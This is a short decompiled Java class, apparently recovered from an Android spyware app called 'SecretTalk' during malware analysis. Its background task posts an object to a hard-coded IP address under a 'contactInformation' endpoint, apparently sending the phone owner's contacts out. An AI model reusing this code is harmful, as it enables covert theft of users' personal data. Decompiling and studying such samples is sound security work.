package com.android.secrettalk;

import android.os.AsyncTask;
import com.google.gson.JsonObject;
import java.net.URI;

class SecretTalk$1
  extends AsyncTask<Void, Void, Void>
{
  SecretTalk$1(SecretTalk paramSecretTalk) {}
  
  protected Void doInBackground(Void... paramVarArgs)
  {
    HttpManager.postHttpResponse(URI.create("http://61.33.28.196/secrettalk.server/api/api.php?mName=contactInformation&format=json"), this.this$0._obj.toString());
    return null;
  }
}


/* Location:           D:\ManalProject\Manal\Manal-plugin\tools\decompiler\tools\classes-dex2jar.jar
 * Qualified Name:     com.android.secrettalk.SecretTalk.1
 * JD-Core Version:    0.7.0.1
 */